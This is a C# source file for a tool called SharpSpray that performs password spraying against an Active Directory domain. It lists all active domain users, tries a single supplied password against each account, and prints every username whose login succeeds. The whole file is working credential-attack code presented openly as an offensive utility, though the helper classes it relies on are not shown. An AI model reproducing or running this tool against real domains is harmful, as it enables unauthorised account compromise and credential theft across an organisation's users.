using System;
using System.Collections.Generic;
using System.Linq;
using System.DirectoryServices.AccountManagement;
using System.Text;
using System.DirectoryServices.ActiveDirectory;
using System.IO;

namespace SharpDomainSpray
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                System.Console.WriteLine("SharpSpray: Perform password spraying for all active users on a domain.");
                System.Console.WriteLine("");
                System.Console.WriteLine("Usage: SharpSpray.exe PASSWORD");
            }

            string pass_to_guess = String.Empty;

            if (args.Length == 1)
            {
                pass_to_guess = args[0];
            }

            List<string> ad_users = new List<string>();
            string domain_name = DomainInformation.GetDomainOrWorkgroup();

            ADUser aduser = new ADUser();
            ad_users = aduser.ADuser();

            ADAuth auth = new ADAuth();
            bool valid_or_not = false;
            foreach (string line in ad_users)
                {
                    valid_or_not = auth.Authenticate(line, pass_to_guess, domain_name);
                        if (valid_or_not == true)
                        {
                        Console.WriteLine("");
                        Console.WriteLine("User: " + line + " " + "Password is: " + pass_to_guess);
                        }
                    
                }
             
        }
 
    }
}
